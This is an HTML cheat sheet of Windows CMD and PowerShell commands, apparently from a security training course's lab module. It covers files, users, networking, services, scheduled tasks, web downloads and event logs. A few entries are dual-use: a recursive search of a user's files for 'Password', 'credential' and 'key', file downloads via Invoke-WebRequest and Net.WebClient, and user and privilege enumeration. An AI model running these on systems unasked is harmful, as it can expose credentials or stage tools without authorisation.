
<body>
  <div class="container">
<link rel="stylesheet" href="style.css">


<h1 id="introduction-to-windows-command-line">Introduction to Windows Command Line</h1>
<p>Cheat Sheet</p>
<p>The cheat sheet is a useful command reference for this module.</p>
<h2 id="introduction-to-windows-command-line">Introduction to Windows Command Line</h2>
<hr>
<h2 id="admin-commands">Admin Commands</h2>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>xfreerdp /v:&lt;target IP&gt; /u:&lt;user&gt; /p:&lt;password&gt;</code></td>
<td>Initiate a RDP connection with the target host.</td>
</tr>
<tr>
<td><code>ssh &lt;user&gt;@&lt;target IP&gt;</code></td>
<td>Connect to target host via SSH.</td>
</tr>
<tr>
<td><code>&lt;PIPE&gt;</code></td>
<td>When you see <code>&lt;PIPE&gt;</code> specified in the commands below, it is saying to use the Pipe key (shift+backslash on US Keyboard layouts).</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="general-commands">General Commands</h2>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>help &lt;command&gt;</code></td>
<td>Provides help information for Windows commands.</td>
</tr>
<tr>
<td><code>Get-Help &lt;cmdlet&gt;</code></td>
<td>Displays help about Windows PowerShell cmdlets and concepts.</td>
</tr>
<tr>
<td><code>Update-Help</code></td>
<td>Downloads and installs the most up-to-date help files for Windows PowerShell.</td>
</tr>
<tr>
<td><code>CTRL-C</code></td>
<td>Interrupts a currently running process.</td>
</tr>
<tr>
<td><code>Get-Module</code></td>
<td>View the modules loaded into your PowerShell session.</td>
</tr>
<tr>
<td><code>Import-Module</code></td>
<td>Import a module into your PowerShell session.</td>
</tr>
<tr>
<td><code>Get-Command</code></td>
<td>View all commands, cmdlets, functions, and aliases loaded into your PowerShell session.</td>
</tr>
<tr>
<td><code>Set-Location &lt;path&gt;</code></td>
<td>Changes our location in the filesystem. Same as using CD.</td>
</tr>
<tr>
<td><code>Get-Content &lt;file&gt;</code></td>
<td>View the contents of an object. Similar to type or cat.</td>
</tr>
<tr>
<td><code>systeminfo</code></td>
<td>Displays operating system configuration information for a local or remote machine.</td>
</tr>
<tr>
<td><code>hostname</code></td>
<td>Displays the name of the current host.</td>
</tr>
<tr>
<td><code>ver</code></td>
<td>Displays the current Windows version.</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="terminal-history">Terminal History</h2>
<table>
<thead>
<tr>
<th><strong>Command/Key</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>doskey /history</code></td>
<td>Prints out the session&#39;s command history to the terminal or output it to a file when specified.</td>
</tr>
<tr>
<td><code>page up</code></td>
<td>Places the first command in our session history to the prompt.</td>
</tr>
<tr>
<td><code>page down</code></td>
<td>Places the last command in history to the prompt.</td>
</tr>
<tr>
<td><code>⇧</code></td>
<td>Scrolls up through our command history to view previously run commands.</td>
</tr>
<tr>
<td><code>⇩</code></td>
<td>Scrolls down to our most recent commands run.</td>
</tr>
<tr>
<td><code>⇨</code></td>
<td>Types the previous command to prompt one character at a time.</td>
</tr>
<tr>
<td><code>F3</code></td>
<td>Retypes the entire previous entry to our prompt.</td>
</tr>
<tr>
<td><code>F5</code></td>
<td>Pressing F5 multiple times allows us to cycle through previous commands.</td>
</tr>
<tr>
<td><code>F7</code></td>
<td>Opens an interactive list of previous commands.</td>
</tr>
<tr>
<td><code>F9</code></td>
<td>Enters a command to our prompt based on the number specified. The number corresponds to the command&#39;s place in our history.</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="file-directory-commands">File &amp; Directory Commands</h2>
<p><strong>CMD.exe</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>dir</code></td>
<td>Lists directory contents.</td>
</tr>
<tr>
<td><code>dir /A &lt;attributes&gt;</code></td>
<td>List directory contents with the specified attributes.</td>
</tr>
<tr>
<td><code>dir /A:H</code></td>
<td>List hidden files in the current directory.</td>
</tr>
<tr>
<td><code>dir /A:R</code></td>
<td>List read-only files in the current directory.</td>
</tr>
<tr>
<td><code>cd</code></td>
<td>Prints current working directory.</td>
</tr>
<tr>
<td><code>chdir</code></td>
<td>Prints current working directory. Alternate command.</td>
</tr>
<tr>
<td><code>cd &lt;path&gt;</code></td>
<td>Changes the directory.</td>
</tr>
<tr>
<td><code>chdir &lt;path&gt;</code></td>
<td>Changes the directory. Alternate command.</td>
</tr>
<tr>
<td><code>tree &lt;path&gt;</code></td>
<td>Graphically displays the directory structure from the specified path.</td>
</tr>
<tr>
<td><code>tree /F &lt;path&gt;</code></td>
<td>Graphically displays the directory structure from the specified path, including files within the directory</td>
</tr>
<tr>
<td><code>cls</code></td>
<td>Clears the terminal.</td>
</tr>
<tr>
<td><code>mkdir &lt;directory name&gt;</code></td>
<td>Creates a directory in the current working directory(or specified directory) with the specified name.</td>
</tr>
<tr>
<td><code>md &lt;directory name&gt;</code></td>
<td>Creates a directory in the current working directory(or specified directory) with the specified name. Alias of mkdir.</td>
</tr>
<tr>
<td><code>rmdir &lt;directory name&gt;</code></td>
<td>Removes a directory in the current working directory(or specified directory) with the specified name.</td>
</tr>
<tr>
<td><code>rd &lt;directory name&gt;</code></td>
<td>Removes a directory in the current working directory(or specified directory) with the specified name. Alias of rmdir</td>
</tr>
<tr>
<td><code>rmdir /S &lt;directory name&gt;</code></td>
<td>Recursively removes all directories and files in the specified directory.</td>
</tr>
<tr>
<td><code>move [source] [destination]</code></td>
<td>Move file(s) from the source folder to the destination folder.</td>
</tr>
<tr>
<td><code>copy [source] [destination]</code></td>
<td>Copy file(s) from the source folder to the destination folder. Only works with files and not folders.</td>
</tr>
<tr>
<td><code>copy [source] [destination] /V</code></td>
<td>Copy file(s) from the source folder to the destination folder. Validates that the file or files are copied correctly.</td>
</tr>
<tr>
<td><code>xcopy [source] [destination]</code></td>
<td>Copy file(s) and folder(s) from the source folder to the destination folder. Replaced by Robocopy and currently deprecated.</td>
</tr>
<tr>
<td><code>xcopy /E [source] [destination]</code></td>
<td>Copy file(s) and folder(s) from the source folder to the destination folder, including empty directories.</td>
</tr>
<tr>
<td><code>xcopy /K [source] [destination]</code></td>
<td>Copy file(s) and folder(s) from the source folder to the destination folder. Retains the current attributes of the copied files.</td>
</tr>
<tr>
<td><code>robocopy [source] [destination]</code></td>
<td>Copy files(s) and folder(s) from the source folder to the destination folder. It has a more robust feature set compared to xcopy.</td>
</tr>
<tr>
<td><code>robocopy /E /MIR /A-:SH [source] [destination]</code></td>
<td>Copy files(s) and folder(s) from the source folder to the destination folder. Mirrors the destination directory to the source and clears any additional attributes using the <code>/A-:SH</code> parameter.</td>
</tr>
<tr>
<td><code>more &lt;file&gt;</code></td>
<td>Displays the output of a file or command one screen at a time.</td>
</tr>
<tr>
<td><code>more /S &lt;file&gt;</code></td>
<td>Displays the output of a file or command one screen at a time. Compresses multiple blank lines into a single line.</td>
</tr>
<tr>
<td><code>&lt;command&gt; &lt;PIPE&gt; more</code></td>
<td>Displays the output of a command through a \<PIPE> to <code>more</code>.</td>
</tr>
<tr>
<td><code>type &lt;file&gt;</code></td>
<td>Displays the contents of a file.</td>
</tr>
<tr>
<td><code>fsutil file createNew &lt;filename&gt; &lt;length&gt;</code></td>
<td>Creates a new file with a specified file name and length.</td>
</tr>
<tr>
<td><code>echo &quot;example string&quot; &gt; &lt;filename&gt;</code></td>
<td>Writes the contents provided into a new or existing file with the specified filename. If the file does not exist, a new one will be created; otherwise, the previous file&#39;s contents will be overwritten.</td>
</tr>
<tr>
<td><code>echo &quot;example string&quot; &gt;&gt; &lt;filename&gt;</code></td>
<td>Appends the provided contents to an existing file.</td>
</tr>
<tr>
<td><code>ren &lt;filename1&gt; &lt;filename2&gt;</code></td>
<td>Renames a file.</td>
</tr>
<tr>
<td><code>del &lt;file&gt;</code></td>
<td>Deletes a file or files.</td>
</tr>
<tr>
<td><code>del /A:R &lt;file&gt;</code></td>
<td>Deletes a file or files with the read-only attribute set.</td>
</tr>
<tr>
<td><code>del /A:H &lt;file&gt;</code></td>
<td>Deletes a file or files with the hidden attribute set.</td>
</tr>
<tr>
<td><code>erase &lt;file&gt;</code></td>
<td>Deletes a file or files. Interchangeable with <code>del</code> command.</td>
</tr>
</tbody>
</table>
<p><strong>PowerShell</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Alias</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Get-Item</code></td>
<td>gi</td>
<td>Retrieve an object (could be a file, folder, registry object, etc.)</td>
</tr>
<tr>
<td><code>Get-ChildItem</code></td>
<td>ls / dir / gci</td>
<td>Lists out the content of a folder or registry hive.</td>
</tr>
<tr>
<td><code>New-Item</code></td>
<td>md / mkdir / ni</td>
<td>Create new objects. ( can be files, folders, symlinks, registry entries and more)</td>
</tr>
<tr>
<td><code>new-item -name &quot;Name&quot; -ItemType &lt;directory/file&gt;</code></td>
<td>Specify the new items name and object type.</td>
<td></td>
</tr>
<tr>
<td><code>Set-Item</code></td>
<td>si</td>
<td>Modify the property values of an object.</td>
</tr>
<tr>
<td><code>Copy-Item</code></td>
<td>copy / cp / ci</td>
<td>Make a duplicate of the item.</td>
</tr>
<tr>
<td><code>Rename-Item</code></td>
<td>ren / rni</td>
<td>Changes the object name.</td>
</tr>
<tr>
<td><code>Rename-Item .\Object-1.md -NewName Object-2.md</code></td>
<td>Rename object-1 to object-2.</td>
<td></td>
</tr>
<tr>
<td><code>Remove-Item</code></td>
<td>rm / del / rmdir</td>
<td>Deletes the object.</td>
</tr>
<tr>
<td><code>Get-Content</code></td>
<td>cat / type</td>
<td>Displays the content within a file or object.</td>
</tr>
<tr>
<td><code>Add-Content &lt;file&gt; &quot;Content to add&quot;</code></td>
<td>ac</td>
<td>Append content to a file.</td>
</tr>
<tr>
<td><code>Set-Content</code></td>
<td>sc</td>
<td>overwrite any content in a file with new data.</td>
</tr>
<tr>
<td><code>Clear-Content</code></td>
<td>clc</td>
<td>Clear the content of the files without deleting the file itself.</td>
</tr>
<tr>
<td><code>Compare-Object</code></td>
<td>diff / compare</td>
<td>Compare two or more objects against each other. This includes the object itself and the content within.</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="input-output-operators">Input/Output Operators</h2>
<table>
<thead>
<tr>
<th><strong>Operator</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>[command] &gt; [file]</code></td>
<td>Redirects the output from a command into a file. Overwrites the specified files&#39; contents.</td>
</tr>
<tr>
<td><code>[command] &gt;&gt; [file]</code></td>
<td>Redirects the output from a command into a file. Appends additional output without overwriting the file&#39;s original contents.</td>
</tr>
<tr>
<td><code>[command] &lt; [file]</code></td>
<td>Redirects the output of the file and passes it into the command.</td>
</tr>
<tr>
<td>`[command] \</td>
<td>[command2]`</td>
<td>Redirects the output of the first command into a <code>&lt;PIPE&gt;</code> and provides it to the second command.</td>
</tr>
<tr>
<td><code>[command] &amp; [command2]</code></td>
<td>Executes both commands in succession. It does not perform checks to see if either command passes or fails.</td>
</tr>
<tr>
<td><code>[command] &amp;&amp; [command2]</code></td>
<td>Checks to see if the first command executes successfully and then executes the second command. If the first command fails, the current command execution halts and the second command is not executed.</td>
</tr>
<tr>
<td>`[command] \</td>
<td>\</td>
<td>[command2]`</td>
<td>Checks to see if the first command fails to execute successfully and, if so, proceeds to execute the second command.</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="find-filter-content">Find &amp; Filter Content</h2>
<p><strong>CMD.exe</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>where &lt;file&gt;</code></td>
<td>Displays the location of file(s) provided.</td>
</tr>
<tr>
<td><code>where /R &lt;working directory&gt; &lt;file&gt;</code></td>
<td>Recursively searches for the file(s) provided starting from the specified directory.</td>
</tr>
<tr>
<td><code>find &quot;example string&quot; &lt;file&gt;</code></td>
<td>Searches for a string of text in a file or files, and displays lines of text that contain the specified string.</td>
</tr>
<tr>
<td><code>findstr</code></td>
<td>Searches for patterns of text in files. Similar to <code>grep</code> on Unix/Linux.</td>
</tr>
<tr>
<td><code>comp &lt;file1&gt; &lt;file2&gt;</code></td>
<td>Compares the contents of two files or sets of files byte-by-byte.</td>
</tr>
<tr>
<td><code>fc &lt;file1&gt; &lt;file2&gt;</code></td>
<td>Compares two files or sets of files and displays the differences between them.</td>
</tr>
<tr>
<td><code>sort</code></td>
<td>Reads input, sorts data, and writes the results to the screen, a file, or another device.</td>
</tr>
</tbody>
</table>
<p><strong>PowerShell</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Get-Item &lt;item&gt; &lt;PIPE&gt; get-member</code></td>
<td>Use Get-Item to select an object and then Get-Member to view the object&#39;s properties.</td>
</tr>
<tr>
<td><code>Get-Item &lt;item&gt; &lt;PIPE&gt; Select-Object -Property *</code></td>
<td>Select an object and then view its Property values.</td>
</tr>
<tr>
<td><code>Get-Item * &lt;PIPE&gt; Select-Object -Property Name,PasswordLastSet</code></td>
<td>Select objects and then filter to view specific properties.</td>
</tr>
<tr>
<td><code>Get-Item * &lt;PIPE&gt; Sort-Object -Property Name &lt;PIPE&gt; Group-Object -property Enabled</code></td>
<td>Sort and view Objects by a specific property setting.</td>
</tr>
<tr>
<td><code>Get-ChildItem -Path C:\Users\MTanaka\ -File -Recurse</code></td>
<td>List all File objects in the directory specified.</td>
</tr>
<tr>
<td><code>Get-Childitem -Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue &lt;PIPE&gt; where {($_.Name -like &quot;*.txt&quot;)}</code></td>
<td>Search for all objects with the &#39;.txt&#39; file extension.</td>
</tr>
<tr>
<td><code>Get-Childitem –Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue &lt;PIPE&gt; where {($_.Name -like &quot;*.txt&quot; -or $_.Name -like &quot;*.py&quot; -or $_.Name -like &quot;*.ps1&quot; -or $_.Name -like &quot;*.md&quot; -or $_.Name -like &quot;*.csv&quot;)}</code></td>
<td>Search for objects matching a list of different file extensions.</td>
</tr>
<tr>
<td><code>Get-ChildItem -Path C:\Users\MTanaka\ -Filter &quot;*.txt&quot; -Recurse -File &lt;PIPE&gt; sls &quot;Password&quot;,&quot;credential&quot;,&quot;key&quot;</code></td>
<td>Searching for keywords within an object&#39;s content.</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="user-commands">User Commands</h2>
<p><strong>CMD.exe</strong></p>
<table>
<thead>
<tr>
<th><strong>Commands</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>whoami</code></td>
<td>Displays the username of the currently logged-on user.</td>
</tr>
<tr>
<td><code>whoami /priv</code></td>
<td>Displays the security privileges of the current user.</td>
</tr>
<tr>
<td><code>whoami /groups</code></td>
<td>Displays the user groups that the current user belongs to.</td>
</tr>
<tr>
<td><code>whoami /all</code></td>
<td>Displays all information about the current user, including username, security identifiers (SID), privileges, and groups.</td>
</tr>
<tr>
<td><code>net user</code></td>
<td>Displays a list of the user accounts on the computer</td>
</tr>
<tr>
<td><code>net localgroup</code></td>
<td>Displays the name of the server and the names of local groups on the computer.</td>
</tr>
<tr>
<td><code>net group</code></td>
<td>Displays the name of a server and the names of groups on the server. Only able to be used if the machine is joined to the domain.</td>
</tr>
</tbody>
</table>
<p><strong>PowerShell</strong></p>
<table>
<thead>
<tr>
<th><strong>Commands</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Get-LocalGroup</code></td>
<td>View all groups specific to the host only.</td>
</tr>
<tr>
<td><code>Get-LocalUser</code></td>
<td>View all local users. Similar to net user.</td>
</tr>
<tr>
<td><code>New-LocalUser -Name &quot;username&quot; -NoPassword</code></td>
<td>Create a new Local user.</td>
</tr>
<tr>
<td><code>Set-LocalUser -Name &quot;username&quot; -Password $Password -Description &quot;users description&quot;</code></td>
<td>Modify a local user&#39;s settings.</td>
</tr>
<tr>
<td><code>Get-LocalGroupMember -Name &quot;Group Name&quot;</code></td>
<td>Check Group membership.</td>
</tr>
<tr>
<td><code>Add-LocalGroupMember -Group &quot;Group Name&quot; -Member &quot;User-To-Add&quot;</code></td>
<td>Add a user to a local group.</td>
</tr>
<tr>
<td>`Get-WindowsCapability -Name RSAT* -Online \</td>
<td>Add-WindowsCapability -Online`</td>
<td>Install Remote System Administration Tools.</td>
</tr>
<tr>
<td><code>Get-Module -Name ActiveDirectory -ListAvailable</code></td>
<td>Locate the Active Directory module.</td>
</tr>
<tr>
<td><code>Get-ADUser -FIlter *</code></td>
<td>List all domain users.</td>
</tr>
<tr>
<td><code>Get-ADUser -Identity &lt;name&gt;</code></td>
<td>Show a specific domain user and its properties.</td>
</tr>
<tr>
<td><code>Get-ADUser -Filter {EmailAddress -like &#39;*greenhorn.corp&#39;}</code></td>
<td>Filter domain users based on the EmailAddress property.</td>
</tr>
<tr>
<td><code>New-ADUser -Name &quot;UserName&quot; -Surname &quot;Last Name&quot; -GivenName &quot;First Name&quot; -Office &quot;Security&quot; -OtherAttributes @{&#39;title&#39;=&quot;Sensei&quot;;&#39;mail&#39;=&quot;UserName@greenhorn.corp&quot;} -Accountpassword (Read-Host -AsSecureString &quot;AccountPassword&quot;) -Enabled $true</code></td>
<td>Create a New Domain user and set its properties such as name, password, and other attributes.</td>
</tr>
<tr>
<td><code>Set-ADUser -Identity &lt;UserName&gt; -Description &quot; Information we want in the description field&quot;</code></td>
<td>Modify the property settings of a domain user.</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="networking-commands">Networking Commands</h2>
<p><strong>CMD.exe</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>ipconfig</code></td>
<td>View basic networking configurations.</td>
</tr>
<tr>
<td><code>ipconfig /?</code></td>
<td>Displays help and usage information for <code>ipconfig</code>.</td>
</tr>
<tr>
<td><code>ipconfig /all</code></td>
<td>View detailed networking configuration information.</td>
</tr>
<tr>
<td><code>net</code></td>
<td>CLI utility containing multiple commands to manage and configure network resources.</td>
</tr>
<tr>
<td><code>net share</code></td>
<td>Displays info about all of the resources that are shared on the local computer.</td>
</tr>
<tr>
<td><code>net view</code></td>
<td>Displays a list of domains, computers, or resources being shared by the specified computer.</td>
</tr>
<tr>
<td><code>arp</code></td>
<td>Displays and manages the contents and entries within the <code>Address Resolution Protocol</code> (ARP) cache.</td>
</tr>
<tr>
<td><code>arp /a</code></td>
<td>Displays the contents and entries contained within the <code>Address Resolution Protocol</code> (ARP) cache.</td>
</tr>
<tr>
<td><code>netstat -an</code></td>
<td>Display current network connections.</td>
</tr>
<tr>
<td><code>nslookup &lt;query&gt;</code></td>
<td>Query DNS for a name or address.</td>
</tr>
</tbody>
</table>
<p><strong>PowerShell</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Get-NetIPInterface -ifIndex &lt;#&gt;</code></td>
<td>Retrieve network adapter <code>properties</code> of the interface listed as ifIndex #.</td>
</tr>
<tr>
<td><code>Get-NetIPAddress</code></td>
<td>Retrieves the <code>IP configurations</code> of each adapter. Similar to <code>IPConfig</code>.</td>
</tr>
<tr>
<td><code>Get-NetNeighbor</code></td>
<td>Retrieves the <code>neighbor entries</code> from the cache. Similar to <code>arp -a</code>.</td>
</tr>
<tr>
<td><code>Get-Netroute</code></td>
<td>Will print the current <code>route table</code>. Similar to <code>IPRoute</code>.</td>
</tr>
<tr>
<td><code>Set-NetAdapter</code></td>
<td>Set basic adapter properties at the <code>Layer-2</code> level, such as VLAN id, description, and MAC-Address.</td>
</tr>
<tr>
<td><code>Set-NetIPInterface</code></td>
<td>Modifies the <code>settings</code> of an <code>interface</code> to include DHCP status, MTU, and other metrics.</td>
</tr>
<tr>
<td><code>Set-NetIPAddress</code></td>
<td>Modifies the <code>configuration</code> of a network adapter.</td>
</tr>
<tr>
<td><code>Disable-NetAdapter</code></td>
<td>Used to <code>disable</code> network adapter interfaces.</td>
</tr>
<tr>
<td><code>Enable-NetAdapter</code></td>
<td>Used to turn network adapters back on and <code>allow</code> network connections.</td>
</tr>
<tr>
<td><code>Restart-NetAdapter</code></td>
<td>Used to restart an adapter. It can be useful to help push <code>changes</code> made to adapter <code>settings</code>.</td>
</tr>
<tr>
<td><code>test-NetConnection</code></td>
<td>Allows for <code>diagnostic</code> checks to be run on a connection. It supports ping, tcp, route tracing, and more.</td>
</tr>
<tr>
<td><code>Get-WindowsCapability -Online &lt;PIPE&gt; Where-Object Name -like &#39;OpenSSH*&#39;</code></td>
<td>List Windows packages for OpenSSH.</td>
</tr>
<tr>
<td><code>Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0</code></td>
<td>Install the SSH package to the host.</td>
</tr>
<tr>
<td><code>ssh &lt;user&gt;@&lt;ip address&gt;</code></td>
<td>Basic SSH connect string.</td>
</tr>
<tr>
<td><code>ssh-keygen</code></td>
<td>Generate SSH keys for the user you run the command as. This enables the use of the user for remote login.</td>
</tr>
<tr>
<td><code>winrm quickconfig</code></td>
<td>Enable WinRM.</td>
</tr>
<tr>
<td><code>Test-WSMan -ComputerName &quot;10.129.224.248&quot;</code></td>
<td>Test if the host specified has WinRM running.</td>
</tr>
<tr>
<td><code>Enter-PSSession -ComputerName 10.129.224.248 -Credential htb-student -Authentication Negotiate</code></td>
<td>Start a remote PowerShell session with the host specified.</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="environment-variables">Environment Variables</h2>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>%EXAMPLE_VARIABLE%</code></td>
<td>Example format for an environment variable.</td>
</tr>
<tr>
<td><code>set</code></td>
<td>Prints all available environment variables on the system.</td>
</tr>
<tr>
<td><code>set &lt;%VARIABLE_NAME%&gt;</code></td>
<td>Prints out the value of the environment variable specified. It can also be used to set the variable&#39;s value.</td>
</tr>
<tr>
<td><code>echo &lt;%VARIABLE_NAME%&gt;</code></td>
<td>Prints out the value of the environment variable specified. It cannot make any edits to variables and will only print out the values to the console.</td>
</tr>
<tr>
<td><code>set &lt;%VARIABLE_NAME%&gt;=&lt;Value&gt;</code></td>
<td>Creates a new environment variable or modifies an existing one and sets the value for the current command line session.</td>
</tr>
<tr>
<td><code>setx &lt;%VARIABLE_NAME%&gt; &lt;Value&gt;</code></td>
<td>Creates a new environment variable or modifies an existing one and sets the value globally by making changes to the registry.</td>
</tr>
<tr>
<td><code>set &lt;%VARIABLE_NAME%&gt;=</code></td>
<td>Removes the environment variable with the specified name for the current command line session.</td>
</tr>
<tr>
<td><code>setx &lt;%VARIABLE_NAME%&gt; &quot;&quot;</code></td>
<td>Removes the environment variable with the specified name globally.</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="services">Services</h2>
<p><strong>CMD.exe</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>sc query</code></td>
<td>Lists all <code>running</code> services and provides additional information for each service.</td>
</tr>
<tr>
<td><code>sc query &lt;Name&gt;</code></td>
<td>Lists details about a specific service by name.</td>
</tr>
<tr>
<td><code>sc start &lt;Name&gt;</code></td>
<td>Start a service by name.</td>
</tr>
<tr>
<td><code>sc stop &lt;Name&gt;</code></td>
<td>Stop a service by name.</td>
</tr>
<tr>
<td><code>sc config &lt;Name&gt; start= disabled</code></td>
<td>Change settings of the service specified.</td>
</tr>
<tr>
<td><code>tasklist /svc</code></td>
<td>Provide a list of services running under each process on the system.</td>
</tr>
<tr>
<td><code>net start</code></td>
<td>List all <code>running</code> services.</td>
</tr>
<tr>
<td><code>wmic service list brief</code></td>
<td>List all services on the system using <code>WMIC</code>. Includes information such as: <code>ExitCode</code>, <code>Name</code>, <code>ProcessID</code>, <code>StartMode</code>, <code>State</code>, and <code>Status</code>.</td>
</tr>
</tbody>
</table>
<p><strong>PowerShell</strong></p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Get-service</code></td>
<td>List all services</td>
</tr>
<tr>
<td><code>Get-Service &lt;PIPE&gt; ft DisplayName,Status</code></td>
<td>List all services and format their information by DisplayName and Status.</td>
</tr>
<tr>
<td><code>Get-Service &lt;PIPE&gt; where DisplayName -like &#39;*Name*&#39; &lt;PIPE&gt; ft DisplayName,ServiceName,Status</code></td>
<td>Query for a specific service whose name matches &#39;<em>name</em>&#39;.</td>
</tr>
<tr>
<td><code>Start-Service &lt;Name&gt;</code></td>
<td>Start a service by name.</td>
</tr>
<tr>
<td><code>Stop-Service &lt;Name&gt;</code></td>
<td>Stop a service by name.</td>
</tr>
<tr>
<td><code>Set-Service -Name &lt;Name&gt; -StartType Disabled</code></td>
<td>Change settings of the service specified.</td>
</tr>
<tr>
<td><code>Get-service -ComputerName ACADEMY-ICL-DC</code></td>
<td>Remote query of a hosts services.</td>
</tr>
<tr>
<td>`Get-Service -ComputerName ACADEMY-ICL-DC \</td>
<td>Where-Object {$_.Status -eq &quot;Running&quot;}`</td>
<td>Remote query of services filtered to only show those that are Running.</td>
</tr>
<tr>
<td><code>Invoke-command -ComputerName ACADEMY-ICL-DC,LOCALHOST -ScriptBlock {Get-Service -Name &#39;windefend&#39;}</code></td>
<td>Issue the Get-Service command on a list of hosts.</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="scheduled-tasks">Scheduled Tasks</h2>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>schtasks</code></td>
<td>Displays all tasks scheduled on the local machine.</td>
</tr>
<tr>
<td><code>schtasks /query</code></td>
<td>Displays all tasks scheduled on the local machine. Interchangeable with <code>schtasks</code> command.</td>
</tr>
<tr>
<td><code>schtasks /query /V /FO list</code></td>
<td>Displays all scheduled tasks with <code>verbose</code> information in a <code>list</code> format.</td>
</tr>
<tr>
<td><code>schtasks /create</code></td>
<td>Allows for the creation of scheduled tasks.</td>
</tr>
<tr>
<td><code>schtasks /create /sc &lt;Schedule Frequency&gt; /tn &lt;Task Name&gt; /tr &lt;Program Path&gt;</code></td>
<td>Creates a new scheduled task based on a select <code>schedule</code>, with a provided <code>name</code>, and a <code>program</code> specified to run when the task starts.</td>
</tr>
<tr>
<td><code>schtasks /change</code></td>
<td>Allows for modification of an existing scheduled task.</td>
</tr>
<tr>
<td><code>schtasks /change /tn &lt;Task Name&gt; /ru &lt;Username&gt; /rp &lt;Password&gt;</code></td>
<td>Modifies a scheduled task with a specified <code>name</code> to run under the <code>permissions</code> of the <code>user account</code> using the provided <code>password</code> for authentication.</td>
</tr>
<tr>
<td><code>schtasks /delete</code></td>
<td>Allows for the deletion of scheduled tasks.</td>
</tr>
<tr>
<td><code>schtasks /delete /tn &lt;Task Name&gt;</code></td>
<td>Deletes a scheduled task with the matching name.</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="interacting-with-the-web">Interacting With The Web</h2>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Invoke-WebRequest -Uri &quot;https://website-to-visit&quot; -Method GET</code></td>
<td>Utilizes Invoke-WebRequest to browse to a website and issue a GET request.</td>
</tr>
<tr>
<td><code>Invoke-WebRequest -Uri &quot;https://website-to-visit.html&quot; -Method GET &lt;PIPE&gt; fl Images</code></td>
<td>Issues a GET request to the site specified and then pipes the output to format a list of all image files listed in the site.</td>
</tr>
<tr>
<td><code>Invoke-WebRequest -Uri &quot;https://website-to-visit\file.ps1&quot; -OutFile &quot;C:\&lt;filename&gt;&quot;</code></td>
<td>Downloads a file from the website and writes it to disk with -Outfile.</td>
</tr>
<tr>
<td><code>(New-Object Net.WebClient).DownloadFile(&quot;https://website-to-visit\tools.zip&quot;, &quot;Tools.zip&quot;)</code></td>
<td>Uses the .NET string Net.WebClient to download a file from the URL specified.</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="event-log">Event Log</h2>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>wevtutil el</code></td>
<td>Uses the Windows Events Commandline utility to enumerate all log sources.</td>
</tr>
<tr>
<td><code>wevtutil gl &quot;name&quot;</code></td>
<td>Will gather config information about the log specified.</td>
</tr>
<tr>
<td><code>wevtutil qe &lt;Name&gt; /c:5 /rd:true /f:text</code></td>
<td>Query a log for events.</td>
</tr>
<tr>
<td><code>wevtutil epl &lt;Name&gt; C:\system_export.evtx</code></td>
<td>Export a Log.</td>
</tr>
<tr>
<td><code>Get-WinEvent -ListLog *</code></td>
<td>List all logging facilities using PowerShell cmdlets.</td>
</tr>
<tr>
<td><code>Get-WinEvent -LogName &#39;Name&#39; -MaxEvents 5 &lt;PIPE&gt; Select-Object -ExpandProperty Message</code></td>
<td>View the messages of a specific log.</td>
</tr>
<tr>
<td><code>Get-WinEvent -FilterHashTable @{LogName=&#39;Security&#39;;ID=&#39;4625 &#39;}</code></td>
<td>Query for a specific log by eventID.</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="windows-registry">Windows Registry</h2>
<p><strong>Registry Hives</strong></p>
<table>
